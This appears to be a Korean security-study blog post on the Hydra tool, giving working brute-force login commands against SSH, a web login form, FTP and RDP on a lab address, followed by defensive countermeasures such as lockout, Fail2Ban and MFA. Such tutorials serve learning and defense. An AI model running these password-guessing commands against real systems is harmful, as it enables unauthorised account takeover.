---
layout: post
title: "Hydra 공부: 네트워크 로그인 무차별 대입 공격"
date: 2025-08-28 17:00:00 +0900
categories: [hacking-tools]
tags: [Hydra, Brute Force, Password Cracking, Hacking Tool]
description: "Hydra를 이용한 SSH, FTP, Web Form 로그인 크래킹 방법과 방어 대책"
---

## 1. 개요

**Hydra**는 네트워크 로그인 서비스에 대해 무차별 대입 공격(Brute-force Attack)을 수행하는 가장 빠르고 유연한 도구 중 하나입니다.
SSH, FTP, Telnet, RDP, Database, HTTP/HTTPS 등 50개 이상의 다양한 프로토콜을 지원하며, 병렬 연결을 통해 고속으로 계정 정보를 찾아낼 수 있습니다.

---

## 2. 기본 사용법 및 옵션

Hydra의 기본 구문은 다음과 같습니다.

```bash
hydra [옵션] [대상 IP] [프로토콜] [모듈 옵션]
```

### 주요 옵션
*   **-l [username]**: 단일 사용자 이름을 지정합니다.
*   **-L [file]**: 사용자 이름 목록(사전) 파일을 지정합니다.
*   **-p [password]**: 단일 비밀번호를 지정합니다.
*   **-P [file]**: 비밀번호 목록(사전) 파일을 지정합니다.
*   **-t [tasks]**: 동시에 실행할 스레드(연결) 수를 지정합니다. (기본값: 16, 너무 높으면 차단될 수 있음)
*   **-v / -V**: 상세 정보를 출력합니다. (`-V`는 시도하는 모든 ID/PW를 보여줌)
*   **-f**: 첫 번째 유효한 계정을 찾으면 즉시 종료합니다.

---

## 3. 실습 1: SSH 서비스 공격

가장 기본적인 SSH 서비스에 대한 공격 예시입니다. `rockyou.txt`와 같은 대규모 사전 파일을 사용하여 `user` 계정의 비밀번호를 찾습니다.

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 192.9.200.11 ssh
```

![HydraSsh](/assets/images/hacking-tools/Hydra_1.png)

---

## 4. 실습 2: 웹 로그인 폼 (HTTP POST Form) 공격

웹 애플리케이션의 로그인 페이지(HTML Form)도 Hydra로 공격할 수 있습니다. 이 경우 `http-post-form` 모듈을 사용하며, 요청 형식을 정확히 지정해야 합니다.

### 4.1. 요청 형식 파악
먼저 Burp Suite 등을 이용해 로그인 시 전송되는 패킷의 구조를 파악해야 합니다.
*   **로그인 페이지 URL**: `/login.php`
*   **파라미터**: `username=^USER^&password=^PASS^&Login=Login` (`^USER^`, `^PASS^`는 Hydra가 대입할 위치)
*   **실패 메시지**: `Login failed` (로그인 실패 시 페이지에 뜨는 문구)

### 4.2. 공격 명령어 작성
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.9.200.11 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

![HydraWeb](/assets/images/hacking-tools/Hydra_WebForm.png)

---

## 5. 실습 3: 기타 서비스 공격

### FTP 서비스
```bash
hydra -L users.txt -P pass.txt ftp://192.9.200.11
```

### RDP (원격 데스크톱)
RDP는 속도가 느리므로 타임아웃과 스레드 조절이 중요합니다.
```bash
hydra -l Administrator -P pass.txt -t 1 -W 5 rdp://192.9.200.11
```

---

## 6. 방어 대책

무차별 대입 공격은 로그에 많은 흔적을 남기므로 탐지하고 차단하기 비교적 쉽습니다.

1.  **계정 잠금 정책 (Account Lockout)**: 일정 횟수 이상 로그인 실패 시 계정을 잠그거나 로그인을 지연시킵니다.
2.  **Fail2Ban 사용**: 로그를 모니터링하여 반복적인 실패 시도가 있는 IP를 방화벽에서 자동으로 차단합니다.
3.  **기본 포트 변경**: SSH(22), RDP(3389) 등 잘 알려진 포트를 변경하여 자동화된 스캔을 회피합니다.
4.  **MFA (다중 인증) 도입**: 비밀번호 외에 OTP 등 추가 인증 수단을 사용하여 비밀번호가 노출되어도 로그인을 막습니다.
5.  **SSH 키 인증 사용**: 비밀번호 인증을 비활성화하고 SSH 키 쌍을 이용한 인증만 허용합니다.

<hr class="short-rule">